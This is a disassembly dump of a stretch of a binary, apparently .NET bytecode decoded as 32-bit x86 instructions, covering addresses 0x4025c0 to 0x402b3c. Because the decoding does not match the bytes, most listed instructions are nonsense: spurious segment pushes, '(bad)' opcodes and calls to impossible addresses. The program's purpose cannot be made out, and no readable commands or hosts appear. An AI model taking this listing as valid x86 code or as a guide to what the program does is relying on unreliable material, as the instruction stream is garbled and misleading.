  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	00 16                	add    %dl,(%esi)
  4025c5:	28 1a                	sub    %bl,(%edx)
  4025c7:	00 00                	add    %al,(%eax)
  4025c9:	06                   	push   %es
  4025ca:	00 14 fe             	add    %dl,(%esi,%edi,8)
  4025cd:	06                   	push   %es
  4025ce:	22 00                	and    (%eax),%al
  4025d0:	00 06                	add    %al,(%esi)
  4025d2:	73 35                	jae    0x402609
  4025d4:	00 00                	add    %al,(%eax)
  4025d6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  4025d9:	21 00                	and    %eax,(%eax)
  4025db:	00 0a                	add    %cl,(%edx)
  4025dd:	20 e8                	and    %ch,%al
  4025df:	03 00                	add    (%eax),%eax
  4025e1:	00 20                	add    %ah,(%eax)
  4025e3:	b8 0b 00 00 6f       	mov    $0x6f00000b,%eax
  4025e8:	2c 00                	sub    $0x0,%al
  4025ea:	00 0a                	add    %cl,(%edx)
  4025ec:	73 21                	jae    0x40260f
  4025ee:	00 00                	add    %al,(%eax)
  4025f0:	0a 20                	or     (%eax),%ah
  4025f2:	e8 03 00 00 20       	call   0x204025fa
  4025f7:	b8 0b 00 00 6f       	mov    $0x6f00000b,%eax
  4025fc:	2c 00                	sub    $0x0,%al
  4025fe:	00 0a                	add    %cl,(%edx)
  402600:	73 36                	jae    0x402638
  402602:	00 00                	add    %al,(%eax)
  402604:	0a 28                	or     (%eax),%ch
  402606:	11 00                	adc    %eax,(%eax)
  402608:	00 06                	add    %al,(%esi)
  40260a:	00 14 fe             	add    %dl,(%esi,%edi,8)
  40260d:	06                   	push   %es
  40260e:	23 00                	and    (%eax),%eax
  402610:	00 06                	add    %al,(%esi)
  402612:	73 35                	jae    0x402649
  402614:	00 00                	add    %al,(%eax)
  402616:	0a 14 17             	or     (%edi,%edx,1),%dl
  402619:	17                   	pop    %ss
  40261a:	73 36                	jae    0x402652
  40261c:	00 00                	add    %al,(%eax)
  40261e:	0a 28                	or     (%eax),%ch
  402620:	16                   	push   %ss
  402621:	00 00                	add    %al,(%eax)
  402623:	06                   	push   %es
  402624:	00 14 fe             	add    %dl,(%esi,%edi,8)
  402627:	06                   	push   %es
  402628:	1c 00                	sbb    $0x0,%al
  40262a:	00 06                	add    %al,(%esi)
  40262c:	73 35                	jae    0x402663
  40262e:	00 00                	add    %al,(%eax)
  402630:	0a 14 20             	or     (%eax,%eiz,1),%dl
  402633:	2c 01                	sub    $0x1,%al
  402635:	00 00                	add    %al,(%eax)
  402637:	20 20                	and    %ah,(%eax)
  402639:	03 00                	add    (%eax),%eax
  40263b:	00 73 36             	add    %dh,0x36(%ebx)
  40263e:	00 00                	add    %al,(%eax)
  402640:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  402646:	28 08                	sub    %cl,(%eax)
  402648:	00 00                	add    %al,(%eax)
  40264a:	06                   	push   %es
  40264b:	28 0a                	sub    %cl,(%edx)
  40264d:	00 00                	add    %al,(%eax)
  40264f:	06                   	push   %es
  402650:	28 0e                	sub    %cl,(%esi)
  402652:	00 00                	add    %al,(%eax)
  402654:	06                   	push   %es
  402655:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  40265b:	69 14 fe 06 20 00 00 	imul   $0x2006,(%esi,%edi,8),%edx
  402662:	06                   	push   %es
  402663:	73 37                	jae    0x40269c
  402665:	00 00                	add    %al,(%eax)
  402667:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  40266a:	38 00                	cmp    %al,(%eax)
  40266c:	00 0a                	add    %cl,(%edx)
  40266e:	26 00 2b             	add    %ch,%es:(%ebx)
  402671:	0a 00                	or     (%eax),%al
  402673:	16                   	push   %ss
  402674:	28 13                	sub    %dl,(%ebx)
  402676:	00 00                	add    %al,(%eax)
  402678:	06                   	push   %es
  402679:	00 de                	add    %bl,%dh
  40267b:	19 00                	sbb    %eax,(%eax)
  40267d:	de 16                	ficoms (%esi)
  40267f:	26 00 72 57          	add    %dh,%es:0x57(%edx)
  402683:	01 00                	add    %eax,(%eax)
  402685:	70 28                	jo     0x4026af
  402687:	2e 00 00             	add    %al,%cs:(%eax)
  40268a:	0a 00                	or     (%eax),%al
  40268c:	16                   	push   %ss
  40268d:	28 13                	sub    %dl,(%ebx)
  40268f:	00 00                	add    %al,(%eax)
  402691:	06                   	push   %es
  402692:	00 de                	add    %bl,%dh
  402694:	00 2a                	add    %ch,(%edx)
  402696:	00 00                	add    %al,(%eax)
  402698:	41                   	inc    %ecx
  402699:	4c                   	dec    %esp
  40269a:	00 00                	add    %al,(%eax)
  40269c:	00 00                	add    %al,(%eax)
  40269e:	00 00                	add    %al,(%eax)
  4026a0:	d9 00                	flds   (%eax)
  4026a2:	00 00                	add    %al,(%eax)
  4026a4:	24 00                	and    $0x0,%al
  4026a6:	00 00                	add    %al,(%eax)
  4026a8:	fd                   	std
  4026a9:	00 00                	add    %al,(%eax)
  4026ab:	00 05 00 00 00 0f    	add    %al,0xf000000
  4026b1:	00 00                	add    %al,(%eax)
  4026b3:	01 02                	add    %eax,(%edx)
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 31                	add    %dh,(%ecx)
  4026b9:	01 00                	add    %eax,(%eax)
  4026bb:	00 7f 00             	add    %bh,0x0(%edi)
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	b0 01                	mov    $0x1,%al
  4026c2:	00 00                	add    %al,(%eax)
  4026c4:	0d 00 00 00 00       	or     $0x0,%eax
  4026c9:	00 00                	add    %al,(%eax)
  4026cb:	00 00                	add    %al,(%eax)
  4026cd:	00 00                	add    %al,(%eax)
  4026cf:	00 01                	add    %al,(%ecx)
  4026d1:	00 00                	add    %al,(%eax)
  4026d3:	00 2e                	add    %ch,(%esi)
  4026d5:	03 00                	add    (%eax),%eax
  4026d7:	00 2f                	add    %ch,(%edi)
  4026d9:	03 00                	add    (%eax),%eax
  4026db:	00 16                	add    %dl,(%esi)
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	00 0f                	add    %cl,(%edi)
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	01 13                	add    %edx,(%ebx)
  4026e5:	30 01                	xor    %al,(%ecx)
  4026e7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4026ea:	00 00                	add    %al,(%eax)
  4026ec:	02 00                	add    (%eax),%al
  4026ee:	00 11                	add    %dl,(%ecx)
  4026f0:	00 28                	add    %ch,(%eax)
  4026f2:	12 00                	adc    (%eax),%al
  4026f4:	00 06                	add    %al,(%esi)
  4026f6:	0a 06                	or     (%esi),%al
  4026f8:	2c 09                	sub    $0x9,%al
  4026fa:	00 14 28             	add    %dl,(%eax,%ebp,1)
  4026fd:	22 00                	and    (%eax),%al
  4026ff:	00 06                	add    %al,(%esi)
  402701:	00 00                	add    %al,(%eax)
  402703:	2a 13                	sub    (%ebx),%dl
  402705:	30 02                	xor    %al,(%edx)
  402707:	00 0f                	add    %cl,(%edi)
  402709:	00 00                	add    %al,(%eax)
  40270b:	00 02                	add    %al,(%edx)
  40270d:	00 00                	add    %al,(%eax)
  40270f:	11 00                	adc    %eax,(%eax)
  402711:	02 28                	add    (%eax),%ch
  402713:	39 00                	cmp    %eax,(%eax)
  402715:	00 0a                	add    %cl,(%edx)
  402717:	16                   	push   %ss
  402718:	fe 03                	incb   (%ebx)
  40271a:	0a 2b                	or     (%ebx),%ch
  40271c:	00 06                	add    %al,(%esi)
  40271e:	2a 00                	sub    (%eax),%al
  402720:	13 30                	adc    (%eax),%esi
  402722:	02 00                	add    (%eax),%al
  402724:	07                   	pop    %es
  402725:	00 00                	add    %al,(%eax)
  402727:	00 02                	add    %al,(%edx)
  402729:	00 00                	add    %al,(%eax)
  40272b:	11 00                	adc    %eax,(%eax)
  40272d:	17                   	pop    %ss
  40272e:	0a 2b                	or     (%ebx),%ch
  402730:	00 06                	add    %al,(%esi)
  402732:	2a 00                	sub    (%eax),%al
  402734:	1b 30                	sbb    (%eax),%esi
  402736:	02 00                	add    (%eax),%al
  402738:	56                   	push   %esi
	...
  402741:	00 28                	add    %ch,(%eax)
  402743:	08 00                	or     %al,(%eax)
  402745:	00 06                	add    %al,(%esi)
  402747:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40274c:	06                   	push   %es
  40274d:	28 3a                	sub    %bh,(%edx)
  40274f:	00 00                	add    %al,(%eax)
  402751:	0a 00                	or     (%eax),%al
  402753:	28 06                	sub    %al,(%esi)
  402755:	00 00                	add    %al,(%eax)
  402757:	06                   	push   %es
  402758:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40275d:	06                   	push   %es
  40275e:	28 3b                	sub    %bh,(%ebx)
  402760:	00 00                	add    %al,(%eax)
  402762:	0a 00                	or     (%eax),%al
  402764:	28 15 00 00 06 25    	sub    %dl,0x25060000
  40276a:	2d 03 26 2b 06       	sub    $0x62b2603,%eax
  40276f:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402772:	00 0a                	add    %cl,(%edx)
  402774:	00 28                	add    %ch,(%eax)
  402776:	10 00                	adc    %al,(%eax)
  402778:	00 06                	add    %al,(%esi)
  40277a:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40277f:	06                   	push   %es
  402780:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402783:	00 0a                	add    %cl,(%edx)
  402785:	00 00                	add    %al,(%eax)
  402787:	de 05 26 00 00 de    	fiadds 0xde000026
  40278d:	00 16                	add    %dl,(%esi)
  40278f:	28 13                	sub    %dl,(%ebx)
  402791:	00 00                	add    %al,(%eax)
  402793:	06                   	push   %es
  402794:	00 2a                	add    %ch,(%edx)
  402796:	00 00                	add    %al,(%eax)
  402798:	01 10                	add    %edx,(%eax)
  40279a:	00 00                	add    %al,(%eax)
  40279c:	00 00                	add    %al,(%eax)
  40279e:	01 00                	add    %eax,(%eax)
  4027a0:	48                   	dec    %eax
  4027a1:	49                   	dec    %ecx
  4027a2:	00 05 0f 00 00 01    	add    %al,0x100000f
  4027a8:	1b 30                	sbb    (%eax),%esi
  4027aa:	06                   	push   %es
  4027ab:	00 20                	add    %ah,(%eax)
  4027ad:	02 00                	add    (%eax),%al
  4027af:	00 05 00 00 11 00    	add    %al,0x110000
  4027b5:	00 28                	add    %ch,(%eax)
  4027b7:	06                   	push   %es
  4027b8:	00 00                	add    %al,(%eax)
  4027ba:	06                   	push   %es
  4027bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4027bc:	25 00 00 0a 2c       	and    $0x2c0a0000,%eax
  4027c1:	0a 28                	or     (%eax),%ch
  4027c3:	12 00                	adc    (%eax),%al
  4027c5:	00 06                	add    %al,(%esi)
  4027c7:	16                   	push   %ss
  4027c8:	fe 01                	incb   (%ecx)
  4027ca:	2b 01                	sub    (%ecx),%eax
  4027cc:	17                   	pop    %ss
  4027cd:	0b 07                	or     (%edi),%eax
  4027cf:	2c 0d                	sub    $0xd,%al
  4027d1:	00 16                	add    %dl,(%esi)
  4027d3:	28 13                	sub    %dl,(%ebx)
  4027d5:	00 00                	add    %al,(%eax)
  4027d7:	06                   	push   %es
  4027d8:	00 dd                	add    %bl,%ch
  4027da:	f5                   	cmc
  4027db:	01 00                	add    %eax,(%eax)
  4027dd:	00 28                	add    %ch,(%eax)
  4027df:	08 00                	or     %al,(%eax)
  4027e1:	00 06                	add    %al,(%esi)
  4027e3:	02 6f 3d             	add    0x3d(%edi),%ch
  4027e6:	00 00                	add    %al,(%eax)
  4027e8:	0a 0a                	or     (%edx),%cl
  4027ea:	06                   	push   %es
  4027eb:	16                   	push   %ss
  4027ec:	fe 02                	incb   (%edx)
  4027ee:	0c 08                	or     $0x8,%al
  4027f0:	39 c6                	cmp    %eax,%esi
  4027f2:	01 00                	add    %eax,(%eax)
  4027f4:	00 00                	add    %al,(%eax)
  4027f6:	28 0e                	sub    %cl,(%esi)
  4027f8:	00 00                	add    %al,(%eax)
  4027fa:	06                   	push   %es
  4027fb:	06                   	push   %es
  4027fc:	6a 58                	push   $0x58
  4027fe:	28 0f                	sub    %cl,(%edi)
  402800:	00 00                	add    %al,(%eax)
  402802:	06                   	push   %es
  402803:	00 28                	add    %ch,(%eax)
  402805:	0c 00                	or     $0x0,%al
  402807:	00 06                	add    %al,(%esi)
  402809:	06                   	push   %es
  40280a:	6a 59                	push   $0x59
  40280c:	28 0d 00 00 06 00    	sub    %cl,0x60000
  402812:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402815:	00 06                	add    %al,(%esi)
  402817:	16                   	push   %ss
  402818:	6a fe                	push   $0xfffffffe
  40281a:	01 0d 09 39 54 01    	add    %ecx,0x1543909
  402820:	00 00                	add    %al,(%eax)
  402822:	00 28                	add    %ch,(%eax)
  402824:	0a 00                	or     (%eax),%al
  402826:	00 06                	add    %al,(%esi)
  402828:	16                   	push   %ss
  402829:	28 3e                	sub    %bh,(%esi)
  40282b:	00 00                	add    %al,(%eax)
  40282d:	0a 6a 28             	or     0x28(%edx),%ch
  402830:	0d 00 00 06 00       	or     $0x60000,%eax
  402835:	72 73                	jb     0x4028aa
  402837:	01 00                	add    %eax,(%eax)
  402839:	70 28                	jo     0x402863
  40283b:	0c 00                	or     $0x0,%al
  40283d:	00 06                	add    %al,(%esi)
  40283f:	13 04 12             	adc    (%edx,%edx,1),%eax
  402842:	04 28                	add    $0x28,%al
  402844:	3f                   	aas
  402845:	00 00                	add    %al,(%eax)
  402847:	0a 72 a1             	or     -0x5f(%edx),%dh
  40284a:	01 00                	add    %eax,(%eax)
  40284c:	70 28                	jo     0x402876
  40284e:	40                   	inc    %eax
  40284f:	00 00                	add    %al,(%eax)
  402851:	0a 28                	or     (%eax),%ch
  402853:	2e 00 00             	add    %al,%cs:(%eax)
  402856:	0a 00                	or     (%eax),%al
  402858:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40285b:	00 06                	add    %al,(%esi)
  40285d:	16                   	push   %ss
  40285e:	6a fe                	push   $0xfffffffe
  402860:	02 13                	add    (%ebx),%dl
  402862:	05 11 05 39 e6       	add    $0xe6390511,%eax
  402867:	00 00                	add    %al,(%eax)
  402869:	00 00                	add    %al,(%eax)
  40286b:	16                   	push   %ss
  40286c:	6a 28                	push   $0x28
  40286e:	0f 00 00             	sldt   (%eax)
  402871:	06                   	push   %es
  402872:	00 28                	add    %ch,(%eax)
  402874:	0c 00                	or     $0x0,%al
  402876:	00 06                	add    %al,(%esi)
  402878:	d4 8d                	aam    $0x8d
  40287a:	59                   	pop    %ecx
  40287b:	00 00                	add    %al,(%eax)
  40287d:	01 28                	add    %ebp,(%eax)
  40287f:	0b 00                	or     (%eax),%eax
  402881:	00 06                	add    %al,(%esi)
  402883:	00 2b                	add    %ch,(%ebx)
  402885:	74 00                	je     0x402887
  402887:	28 08                	sub    %cl,(%eax)
  402889:	00 00                	add    %al,(%eax)
  40288b:	06                   	push   %es
  40288c:	28 0a                	sub    %cl,(%edx)
  40288e:	00 00                	add    %al,(%eax)
  402890:	06                   	push   %es
  402891:	28 0e                	sub    %cl,(%esi)
  402893:	00 00                	add    %al,(%eax)
  402895:	06                   	push   %es
  402896:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  40289c:	69 6f 41 00 00 0a 13 	imul   $0x130a0000,0x41(%edi),%ebp
  4028a3:	07                   	pop    %es
  4028a4:	11 07                	adc    %eax,(%edi)
  4028a6:	16                   	push   %ss
  4028a7:	fe 02                	incb   (%edx)
  4028a9:	16                   	push   %ss
  4028aa:	fe 01                	incb   (%ecx)
  4028ac:	13 08                	adc    (%eax),%ecx
  4028ae:	11 08                	adc    %ecx,(%eax)
  4028b0:	2c 0d                	sub    $0xd,%al
  4028b2:	00 16                	add    %dl,(%esi)
  4028b4:	28 13                	sub    %dl,(%ebx)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	06                   	push   %es
  4028b9:	00 dd                	add    %bl,%ch
  4028bb:	14 01                	adc    $0x1,%al
  4028bd:	00 00                	add    %al,(%eax)
  4028bf:	28 0e                	sub    %cl,(%esi)
  4028c1:	00 00                	add    %al,(%eax)
  4028c3:	06                   	push   %es
  4028c4:	11 07                	adc    %eax,(%edi)
  4028c6:	6a 58                	push   $0x58
  4028c8:	28 0f                	sub    %cl,(%edi)
  4028ca:	00 00                	add    %al,(%eax)
  4028cc:	06                   	push   %es
  4028cd:	00 28                	add    %ch,(%eax)
  4028cf:	0c 00                	or     $0x0,%al
  4028d1:	00 06                	add    %al,(%esi)
  4028d3:	11 07                	adc    %eax,(%edi)
  4028d5:	6a 59                	push   $0x59
  4028d7:	28 0d 00 00 06 00    	sub    %cl,0x60000
  4028dd:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4028e0:	00 06                	add    %al,(%esi)
  4028e2:	16                   	push   %ss
  4028e3:	6a fe                	push   $0xfffffffe
  4028e5:	04 13                	add    $0x13,%al
  4028e7:	09 11                	or     %edx,(%ecx)
  4028e9:	09 2c 0d 00 16 28 13 	or     %ebp,0x13281600(,%ecx,1)
  4028f0:	00 00                	add    %al,(%eax)
  4028f2:	06                   	push   %es
  4028f3:	00 dd                	add    %bl,%ch
  4028f5:	da 00                	fiaddl (%eax)
  4028f7:	00 00                	add    %al,(%eax)
  4028f9:	00 28                	add    %ch,(%eax)
  4028fb:	0c 00                	or     $0x0,%al
  4028fd:	00 06                	add    %al,(%esi)
  4028ff:	16                   	push   %ss
  402900:	6a fe                	push   $0xfffffffe
  402902:	02 13                	add    (%ebx),%dl
  402904:	0a 11                	or     (%ecx),%dl
  402906:	0a 3a                	or     (%edx),%bh
  402908:	7a ff                	jp     0x402909
  40290a:	ff                   	(bad)
  40290b:	ff 14 fe             	call   *(%esi,%edi,8)
  40290e:	06                   	push   %es
  40290f:	47                   	inc    %edi
  402910:	00 00                	add    %al,(%eax)
  402912:	06                   	push   %es
  402913:	73 42                	jae    0x402957
  402915:	00 00                	add    %al,(%eax)
  402917:	0a 73 43             	or     0x43(%ebx),%dh
  40291a:	00 00                	add    %al,(%eax)
  40291c:	0a 13                	or     (%ebx),%dl
  40291e:	06                   	push   %es
  40291f:	11 06                	adc    %eax,(%esi)
  402921:	28 0a                	sub    %cl,(%edx)
  402923:	00 00                	add    %al,(%eax)
  402925:	06                   	push   %es
  402926:	6f                   	outsl  %ds:(%esi),(%dx)
  402927:	44                   	inc    %esp
  402928:	00 00                	add    %al,(%eax)
  40292a:	0a 00                	or     (%eax),%al
  40292c:	16                   	push   %ss
  40292d:	6a 28                	push   $0x28
  40292f:	0f 00 00             	sldt   (%eax)
  402932:	06                   	push   %es
  402933:	00 1a                	add    %bl,(%edx)
  402935:	6a 28                	push   $0x28
  402937:	0d 00 00 06 00       	or     $0x60000,%eax
  40293c:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40293f:	00 06                	add    %al,(%esi)
  402941:	d4 8d                	aam    $0x8d
  402943:	59                   	pop    %ecx
  402944:	00 00                	add    %al,(%eax)
  402946:	01 28                	add    %ebp,(%eax)
  402948:	0b 00                	or     (%eax),%eax
  40294a:	00 06                	add    %al,(%esi)
  40294c:	00 00                	add    %al,(%eax)
  40294e:	2b 23                	sub    (%ebx),%esp
  402950:	00 1a                	add    %bl,(%edx)
  402952:	6a 28                	push   $0x28
  402954:	0d 00 00 06 00       	or     $0x60000,%eax
  402959:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40295c:	00 06                	add    %al,(%esi)
  40295e:	d4 8d                	aam    $0x8d
  402960:	59                   	pop    %ecx
  402961:	00 00                	add    %al,(%eax)
  402963:	01 28                	add    %ebp,(%eax)
  402965:	0b 00                	or     (%eax),%eax
  402967:	00 06                	add    %al,(%esi)
  402969:	00 16                	add    %dl,(%esi)
  40296b:	6a 28                	push   $0x28
  40296d:	0f 00 00             	sldt   (%eax)
  402970:	06                   	push   %es
  402971:	00 00                	add    %al,(%eax)
  402973:	00 2b                	add    %ch,(%ebx)
  402975:	19 28                	sbb    %ebp,(%eax)
  402977:	0c 00                	or     $0x0,%al
  402979:	00 06                	add    %al,(%esi)
  40297b:	16                   	push   %ss
  40297c:	6a fe                	push   $0xfffffffe
  40297e:	04 13                	add    $0x13,%al
  402980:	0b 11                	or     (%ecx),%edx
  402982:	0b 2c 0a             	or     (%edx,%ecx,1),%ebp
  402985:	00 16                	add    %dl,(%esi)
  402987:	28 13                	sub    %dl,(%ebx)
  402989:	00 00                	add    %al,(%eax)
  40298b:	06                   	push   %es
  40298c:	00 de                	add    %bl,%dh
  40298e:	44                   	inc    %esp
  40298f:	28 08                	sub    %cl,(%eax)
  402991:	00 00                	add    %al,(%eax)
  402993:	06                   	push   %es
  402994:	28 0a                	sub    %cl,(%edx)
  402996:	00 00                	add    %al,(%eax)
  402998:	06                   	push   %es
  402999:	28 0e                	sub    %cl,(%esi)
  40299b:	00 00                	add    %al,(%eax)
  40299d:	06                   	push   %es
  40299e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  4029a4:	69 14 fe 06 20 00 00 	imul   $0x2006,(%esi,%edi,8),%edx
  4029ab:	06                   	push   %es
  4029ac:	73 37                	jae    0x4029e5
  4029ae:	00 00                	add    %al,(%eax)
  4029b0:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  4029b3:	38 00                	cmp    %al,(%eax)
  4029b5:	00 0a                	add    %cl,(%edx)
  4029b7:	26 00 2b             	add    %ch,%es:(%ebx)
  4029ba:	0a 00                	or     (%eax),%al
  4029bc:	16                   	push   %ss
  4029bd:	28 13                	sub    %dl,(%ebx)
  4029bf:	00 00                	add    %al,(%eax)
  4029c1:	06                   	push   %es
  4029c2:	00 de                	add    %bl,%dh
  4029c4:	0e                   	push   %cs
  4029c5:	00 de                	add    %bl,%dh
  4029c7:	0b 26                	or     (%esi),%esp
  4029c9:	00 16                	add    %dl,(%esi)
  4029cb:	28 13                	sub    %dl,(%ebx)
  4029cd:	00 00                	add    %al,(%eax)
  4029cf:	06                   	push   %es
  4029d0:	00 de                	add    %bl,%dh
  4029d2:	00 2a                	add    %ch,(%edx)
  4029d4:	41                   	inc    %ecx
  4029d5:	1c 00                	sbb    $0x0,%al
  4029d7:	00 00                	add    %al,(%eax)
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	00 01                	add    %al,(%ecx)
  4029dd:	00 00                	add    %al,(%eax)
  4029df:	00 13                	add    %dl,(%ebx)
  4029e1:	02 00                	add    (%eax),%al
  4029e3:	00 14 02             	add    %dl,(%edx,%eax,1)
  4029e6:	00 00                	add    %al,(%eax)
  4029e8:	0b 00                	or     (%eax),%eax
  4029ea:	00 00                	add    %al,(%eax)
  4029ec:	0f 00 00             	sldt   (%eax)
  4029ef:	01 1b                	add    %ebx,(%ebx)
  4029f1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4029f4:	2d 01 00 00 06       	sub    $0x6000001,%eax
  4029f9:	00 00                	add    %al,(%eax)
  4029fb:	11 00                	adc    %eax,(%eax)
  4029fd:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402a00:	00 06                	add    %al,(%esi)
  402a02:	0a 16                	or     (%esi),%dl
  402a04:	0b 06                	or     (%esi),%eax
  402a06:	12 01                	adc    (%ecx),%al
  402a08:	28 45 00             	sub    %al,0x0(%ebp)
  402a0b:	00 0a                	add    %cl,(%edx)
  402a0d:	00 00                	add    %al,(%eax)
  402a0f:	00 28                	add    %ch,(%eax)
  402a11:	12 00                	adc    (%eax),%al
  402a13:	00 06                	add    %al,(%esi)
  402a15:	16                   	push   %ss
  402a16:	fe 01                	incb   (%ecx)
  402a18:	0d 09 2c 06 00       	or     $0x62c09,%eax
  402a1d:	dd 06                	fldl   (%esi)
  402a1f:	01 00                	add    %eax,(%eax)
  402a21:	00 02                	add    %al,(%edx)
  402a23:	8e 69 28             	mov    0x28(%ecx),%gs
  402a26:	46                   	inc    %esi
  402a27:	00 00                	add    %al,(%eax)
  402a29:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402a2c:	06                   	push   %es
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402a35:	00 0a                	add    %cl,(%edx)
  402a37:	26 28 08             	sub    %cl,%es:(%eax)
  402a3a:	00 00                	add    %al,(%eax)
  402a3c:	06                   	push   %es
  402a3d:	08 16                	or     %dl,(%esi)
  402a3f:	08 8e 69 6f 48 00    	or     %cl,0x486f69(%esi)
  402a45:	00 0a                	add    %cl,(%edx)
  402a47:	00 02                	add    %al,(%edx)
  402a49:	8e 69 20             	mov    0x20(%ecx),%gs
  402a4c:	40                   	inc    %eax
  402a4d:	42                   	inc    %edx
  402a4e:	0f 00                	(bad)
  402a50:	fe 02                	incb   (%edx)
  402a52:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402a55:	04 39                	add    $0x39,%al
  402a57:	87 00                	xchg   %eax,(%eax)
  402a59:	00 00                	add    %al,(%eax)
  402a5b:	00 72 b9             	add    %dh,-0x47(%edx)
  402a5e:	01 00                	add    %eax,(%eax)
  402a60:	70 28                	jo     0x402a8a
  402a62:	2e 00 00             	add    %al,%cs:(%eax)
  402a65:	0a 00                	or     (%eax),%al
  402a67:	02 73 49             	add    0x49(%ebx),%dh
  402a6a:	00 00                	add    %al,(%eax)
  402a6c:	0a 13                	or     (%ebx),%dl
  402a6e:	05 00 16 13 06       	add    $0x6131600,%eax
  402a73:	11 05 16 6a 6f 4a    	adc    %eax,0x4a6f6a16
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	0a 00                	or     (%eax),%al
  402a7d:	20 50 c3             	and    %dl,-0x3d(%eax)
  402a80:	00 00                	add    %al,(%eax)
  402a82:	8d 59 00             	lea    0x0(%ecx),%ebx
  402a85:	00 01                	add    %al,(%ecx)
  402a87:	13 07                	adc    (%edi),%eax
  402a89:	2b 2a                	sub    (%edx),%ebp
  402a8b:	00 28                	add    %ch,(%eax)
  402a8d:	06                   	push   %es
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	06                   	push   %es
  402a91:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402a96:	00 0a                	add    %cl,(%edx)
  402a98:	26 28 08             	sub    %cl,%es:(%eax)
  402a9b:	00 00                	add    %al,(%eax)
  402a9d:	06                   	push   %es
  402a9e:	11 07                	adc    %eax,(%edi)
  402aa0:	16                   	push   %ss
  402aa1:	11 06                	adc    %eax,(%esi)
  402aa3:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa4:	48                   	dec    %eax
  402aa5:	00 00                	add    %al,(%eax)
  402aa7:	0a 00                	or     (%eax),%al
  402aa9:	28 08                	sub    %cl,(%eax)
  402aab:	00 00                	add    %al,(%eax)
  402aad:	06                   	push   %es
  402aae:	6f                   	outsl  %ds:(%esi),(%dx)
  402aaf:	4b                   	dec    %ebx
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 00                	or     (%eax),%al
  402ab4:	00 11                	add    %dl,(%ecx)
  402ab6:	05 11 07 16 11       	add    $0x11160711,%eax
  402abb:	07                   	pop    %es
  402abc:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402abf:	41                   	inc    %ecx
  402ac0:	00 00                	add    %al,(%eax)
  402ac2:	0a 25 13 06 16 fe    	or     0xfe160613,%ah
  402ac8:	02 13                	add    (%ebx),%dl
  402aca:	08 11                	or     %dl,(%ecx)
  402acc:	08 2d bc 00 de 0d    	or     %ch,0xdde00bc
  402ad2:	11 05 2c 08 11 05    	adc    %eax,0x511082c
  402ad8:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad9:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402ade:	dc 00                	faddl  (%eax)
  402ae0:	2b 2a                	sub    (%edx),%ebp
  402ae2:	00 28                	add    %ch,(%eax)
  402ae4:	06                   	push   %es
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	06                   	push   %es
  402ae8:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402aed:	00 0a                	add    %cl,(%edx)
  402aef:	26 28 08             	sub    %cl,%es:(%eax)
  402af2:	00 00                	add    %al,(%eax)
  402af4:	06                   	push   %es
  402af5:	02 16                	add    (%esi),%dl
  402af7:	02 8e 69 6f 48 00    	add    0x486f69(%esi),%cl
  402afd:	00 0a                	add    %cl,(%edx)
  402aff:	00 28                	add    %ch,(%eax)
  402b01:	08 00                	or     %al,(%eax)
  402b03:	00 06                	add    %al,(%esi)
  402b05:	6f                   	outsl  %ds:(%esi),(%dx)
  402b06:	4b                   	dec    %ebx
  402b07:	00 00                	add    %al,(%eax)
  402b09:	0a 00                	or     (%eax),%al
  402b0b:	00 00                	add    %al,(%eax)
  402b0d:	de 0b                	fimuls (%ebx)
  402b0f:	26 00 16             	add    %dl,%es:(%esi)
  402b12:	28 13                	sub    %dl,(%ebx)
  402b14:	00 00                	add    %al,(%eax)
  402b16:	06                   	push   %es
  402b17:	00 de                	add    %bl,%dh
  402b19:	0e                   	push   %cs
  402b1a:	00 de                	add    %bl,%dh
  402b1c:	0b 07                	or     (%edi),%eax
  402b1e:	2c 07                	sub    $0x7,%al
  402b20:	06                   	push   %es
  402b21:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  402b25:	0a 00                	or     (%eax),%al
  402b27:	dc 2a                	fsubrl (%edx)
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	00 41 4c             	add    %al,0x4c(%ecx)
  402b2e:	00 00                	add    %al,(%eax)
  402b30:	02 00                	add    (%eax),%al
  402b32:	00 00                	add    %al,(%eax)
  402b34:	73 00                	jae    0x402b36
  402b36:	00 00                	add    %al,(%eax)
  402b38:	63 00                	arpl   %eax,(%eax)
  402b3a:	00 00                	add    %al,(%eax)
  402b3c:	d6                   	salc
